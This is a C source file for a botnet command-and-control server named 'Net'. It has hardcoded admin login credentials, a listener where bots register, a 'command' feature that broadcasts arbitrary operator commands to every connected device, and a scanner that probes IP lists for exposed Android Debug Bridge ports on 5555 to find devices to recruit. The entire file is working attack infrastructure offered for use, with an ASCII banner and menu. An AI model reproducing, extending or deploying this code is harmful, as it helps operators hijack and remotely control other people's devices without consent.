#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define USER "admin"
#define PASS "net"

#define ADB_FILE_LIST "droid.txt"
#define MAX_DEVICES 99999
#define CNC_IP "0.0.0.0"
#define CNC_PORT 1337 // <- This is for the bots
#define PORT 3434 // <- You use this port to login to the CnC Example: nc <YOUR_IP> 3434


/*
Net
Date: 09/15/21
Author: 0x1CA3
*/


int i;
int d;
int max;
int l;
int sns;
int active;
int valread;
int nnum = 1;
int s_fd;
int ccon[MAX_DEVICES];

unsigned int DEVICE_COUNT = 0;

char sb[1024];
fd_set fd_r;

static void clear_screen(int fd_user) {
    char clear_line_1[1024];
    sprintf(clear_line_1, "\033[H\033[2J");
    send(fd_user, clear_line_1, strlen(clear_line_1), 0);
}

static void bot_count(int fd_user) {
    char botcount[1024];
    char bot_display_line_1[64];
    
    sprintf(bot_display_line_1, "\nBots -> ");
    sprintf(botcount, "%d\n", DEVICE_COUNT);
    
    send(fd_user, bot_display_line_1, strlen(bot_display_line_1), 0);
    send(fd_user, botcount, strlen(botcount), 0);
}

static void cnc_details(int fd_user) {
    char cnc_details_line_1[1024];
    char cnc_details_line_2[1024];
    char cnc_details_line_3[1024];
    char cnc_details_line_4[1024];
    char cnc_details_line_5[1024];
    char cnc_details_line_6[1024];

    sprintf(cnc_details_line_1, "\n         CnC Details");
    sprintf(cnc_details_line_2, "\n         -----------");
    sprintf(cnc_details_line_3, "\n         IP: %s", CNC_IP);
    sprintf(cnc_details_line_4, "\n         Port: %d", CNC_PORT);
    sprintf(cnc_details_line_5, "\n         Account Name: %s", USER);
    sprintf(cnc_details_line_6, "\n         Account Type: Administrator\n");

    send(fd_user, cnc_details_line_1, strlen(cnc_details_line_1), 0);
    send(fd_user, cnc_details_line_2, strlen(cnc_details_line_2), 0);
    send(fd_user, cnc_details_line_3, strlen(cnc_details_line_3), 0);
    send(fd_user, cnc_details_line_4, strlen(cnc_details_line_4), 0);
    send(fd_user, cnc_details_line_5, strlen(cnc_details_line_5), 0);
    send(fd_user, cnc_details_line_6, strlen(cnc_details_line_6), 0);
}

static void help_menu(int fd_user) {
    char help_line_1[1024];
    char help_line_2[1024];
    char help_line_3[1024];
    char help_line_4[1024];
    char help_line_5[1024];
    char help_line_6[1024];
    char help_line_7[1024];
    char help_line_8[1024];
    char help_line_9[1024];
    char help_line_10[1024];
    
    sprintf(help_line_1, "\n          Commands          Description\n");
    sprintf(help_line_2, "          --------          -----------\n");
    sprintf(help_line_3, "          ?/help            Displays available commands.\n");
    sprintf(help_line_4, "          bots/list         Shows the bot count.\n");
    sprintf(help_line_5, "          adb_check         Checks which IP's are online for ADB IP lists. [Make sure you've loaded your list]\n");
    sprintf(help_line_6, "          command           Lets you send a command to all the devices.\n");
    sprintf(help_line_7, "          server            Shows details about the CnC server.\n");
    sprintf(help_line_8, "          banner            Displays the ASCII banner.\n");
    sprintf(help_line_9, "          clear/cls         Clears the screen.\n");
    sprintf(help_line_10, "          exit/quit         Exits the botnet.\n");

    send(fd_user, help_line_1, strlen(help_line_1), 0);
    send(fd_user, help_line_2, strlen(help_line_2), 0);
    send(fd_user, help_line_3, strlen(help_line_3), 0);
    send(fd_user, help_line_4, strlen(help_line_4), 0);
    send(fd_user, help_line_5, strlen(help_line_5), 0);
    send(fd_user, help_line_6, strlen(help_line_6), 0);
    send(fd_user, help_line_7, strlen(help_line_7), 0);
    send(fd_user, help_line_8, strlen(help_line_8), 0);
    send(fd_user, help_line_9, strlen(help_line_9), 0);
    send(fd_user, help_line_10, strlen(help_line_10), 0);
}

static void display_banner(int fd_user) {
    clear_screen(fd_user);
    
    char banner_line_1[1024];
    char banner_line_2[1024];
    char banner_line_3[1024];
    char banner_line_4[1024];
    char banner_line_5[1024];
    char banner_line_6[1024];
    char banner_line_7[1024];
    char banner_line_8[1024];
    char banner_line_9[1024];
    char banner_line_10[1024];
    char banner_line_11[1024];
    char banner_line_12[1024];
    char banner_line_13[1024];

    sprintf(banner_line_1, "\n                                  s    \n");
    sprintf(banner_line_2, "                                 :8    \n");
    sprintf(banner_line_3, "       u.    u.                 .88    \n");
    sprintf(banner_line_4, "     x@88k u@88c.      .u      :888ooo \n");
    sprintf(banner_line_5, "    ^'8888''8888'   ud8888.  -*8888888 \n");
    sprintf(banner_line_6, "      8888  888R  :888'8888.   8888    \n");
    sprintf(banner_line_7, "      8888  888R  d888 '888'   8888    \n");
    sprintf(banner_line_8, "      8888  888R  8888.+'      8888    \n");
    sprintf(banner_line_9, "      8888  888R  8888L       .8888Lu= \n");
    sprintf(banner_line_10, "    '*88*' 8888' '8888c. .+  ^8888*   \n");
    sprintf(banner_line_11, "       ''   'Y'    '888888      'Y'    \n");
    sprintf(banner_line_12, "                     'YP'              \n");
    sprintf(banner_line_13, "    [Made By: https://github.com/0x1CA3]\n\n");

    send(fd_user, banner_line_1, strlen(banner_line_1), 0);
    send(fd_user, banner_line_2, strlen(banner_line_2), 0);
    send(fd_user, banner_line_3, strlen(banner_line_3), 0);
    send(fd_user, banner_line_4, strlen(banner_line_4), 0);
    send(fd_user, banner_line_5, strlen(banner_line_5), 0);
    send(fd_user, banner_line_6, strlen(banner_line_6), 0);
    send(fd_user, banner_line_7, strlen(banner_line_7), 0);
    send(fd_user, banner_line_8, strlen(banner_line_8), 0);
    send(fd_user, banner_line_9, strlen(banner_line_9), 0);
    send(fd_user, banner_line_10, strlen(banner_line_10), 0);
    send(fd_user, banner_line_11, strlen(banner_line_11), 0);
    send(fd_user, banner_line_12, strlen(banner_line_12), 0);
    send(fd_user, banner_line_13, strlen(banner_line_13), 0);
}

void send_bot_commands(int fd_user) {
    char command_buf[1024];
    char command_msg[1024];
    char command_sent_msg[1024];

    sprintf(command_msg, "\n%s@Бotлet-[Enter Command]~# ", USER);
    sprintf(command_sent_msg, "Command successfully sent to all devices!\n");
    
    send(fd_user, command_msg, strlen(command_msg), 0);
    read(fd_user, command_buf, sizeof(command_buf));

    for (i = 0; i < MAX_DEVICES; i++) {
        d = ccon[i];        
        if (FD_ISSET(d, &fd_r)) {
            send(d, command_buf, strlen(command_buf), 0);
        }
    }
    send(fd_user, command_sent_msg, strlen(command_sent_msg), 0);
}

void adb_bot_checker(int fd_user) {
    int fd_c;
    char lines[5000];
    char err_msg_fd[1024];
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_port = htons(5555);
    
    fd_c = socket(AF_INET, SOCK_STREAM, 0);
    
    FILE * list = fopen(ADB_FILE_LIST, "r");
    if (list == NULL) {
        sprintf(err_msg_fd, "Error! List not found!\n");
        send(fd_c, err_msg_fd, strlen(err_msg_fd), 0);
    } else {
        char result[5000];
        while (fgets(lines, sizeof(lines), list) != NULL) {
            client.sin_addr.s_addr = inet_addr(lines);
            if (connect(fd_c, (struct sockaddr *)&client, sizeof(client)) == 0) {
                sprintf(result, "Online! -> %s", lines);
                send(fd_user, result, strlen(result), 0);
            } else {
                sprintf(result, "Offline! -> %s", lines);
                send(fd_user, result, strlen(result), 0);
            }
        }
    }
}

struct function {
    const char *buffer;
    int (*function)(fd_user);
};

struct function botnet_commands[] = {
    {"?", help_menu},
    {"help", help_menu},
    {"bots", bot_count},
    {"list", bot_count},
    {"adb_check", adb_bot_checker},
    {"command", send_bot_commands},
    {"server", cnc_details},
	{"banner", display_banner},
	{"clear", clear_screen},
	{"cls", clear_screen},
};

enum {commands_amount = sizeof(botnet_commands) / sizeof(botnet_commands[0])};

int handler(char buffer[1024], int fd_user) {
    for (int i = 0; i < commands_amount; i++) {
        if (strstr(buffer, botnet_commands[i].buffer) != NULL) {
            return (*botnet_commands[i].function)(fd_user);
        }
    }
}

void *cli(void *fd_user) {
    fd_user = (int *)fd_user;
    char buffer[1024];
    char cmd_line[64];
    sprintf(cmd_line, "\n%s@Бotлet~# ", USER);
    while (1) {
        send(fd_user, cmd_line, strlen(cmd_line), 0);
        read(fd_user, buffer, sizeof(buffer));
        if (strstr(buffer, "exit") || strstr(buffer, "quit") != NULL) {
            break;
        } else {
            handler(buffer, fd_user);
        }
    }
}

int start_cnc(int fd_user) {
    struct sockaddr_in cnc_server;
    
    for (i = 0; i < MAX_DEVICES; i++) {
        ccon[i] = 0;
    }
      
    s_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(s_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&nnum, sizeof(nnum));  

    cnc_server.sin_family = AF_INET;
    cnc_server.sin_addr.s_addr = INADDR_ANY;
    cnc_server.sin_port = htons(CNC_PORT);
      
    bind(s_fd, (struct sockaddr *)&cnc_server, sizeof(cnc_server));     
    listen(s_fd, 3);
    
    pthread_t thread_cli;
    pthread_create(&thread_cli, NULL, cli, fd_user);
    l = sizeof(cnc_server);

    while (1) {
        FD_ZERO(&fd_r);
        FD_SET(s_fd, &fd_r);
        max = s_fd;
         
        for (i = 0; i < MAX_DEVICES; i++) {
            d = ccon[i];             
            if (d > 0) {
                FD_SET(d, &fd_r);
            }
            if (d > max) {
                max = d;
            }
        }
  
        active = select(max + 1, &fd_r, NULL, NULL, NULL);
        if (FD_ISSET(s_fd, &fd_r)) {
            if ((sns = accept(s_fd, (struct sockaddr *)&cnc_server, (socklen_t *)&l)) < 0) {
                exit(EXIT_FAILURE);
            }              
            DEVICE_COUNT++;
            for (i = 0; i < MAX_DEVICES; i++) {
                if (ccon[i] == 0) {
                    ccon[i] = sns;
                    break;
                }
            }
        }
          
        for (i = 0; i < MAX_DEVICES; i++) {
            d = ccon[i];              
            if (FD_ISSET(d, &fd_r)) {
                if ((valread = read(d, sb, 1024)) == 0) {
                    --DEVICE_COUNT;
                    close(d);
                    ccon[i] = 0;
                }                  
            }
        }
    }
}

int main(void) {
    pthread_t cnc;
    char login_buf[1000];
    char pass_buf[1000];
    char login_message[64];
    char password_message[64];
    char good_login_message[64];
    char bad_login_message[64];

    sprintf(login_message, "Login: ");
    sprintf(password_message, "Password: ");

    sprintf(good_login_message, "Sucessfully Authenticated!\n");
    sprintf(bad_login_message, "Invalid credentials!\n");

    struct sockaddr_in sock;
    
    sock.sin_family = AF_INET;
    sock.sin_port = htons(PORT);
    sock.sin_addr.s_addr = inet_addr(CNC_IP);

    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sock_fd, (struct sockaddr *)&sock, sizeof(sock));
    listen(sock_fd, 128);

    int conn_fd = accept(sock_fd, NULL, NULL);
    display_banner(conn_fd);
    
    send(conn_fd, login_message, strlen(login_message), 0);
    read(conn_fd, login_buf, sizeof(login_buf));
        
    send(conn_fd, password_message, strlen(password_message), 0);
    read(conn_fd, pass_buf, sizeof(pass_buf));

    if (strstr(login_buf, USER) != NULL) {
        if (strstr(pass_buf, PASS) != NULL) {
            send(conn_fd, good_login_message, sizeof(good_login_message), 0);
            start_cnc(conn_fd);
        } else {
            send(conn_fd, bad_login_message, sizeof(bad_login_message), 0);
        }
    } else {
        send(conn_fd, bad_login_message, sizeof(bad_login_message), 0);
    }
    
    close(sock_fd);
    EXIT_SUCCESS;
}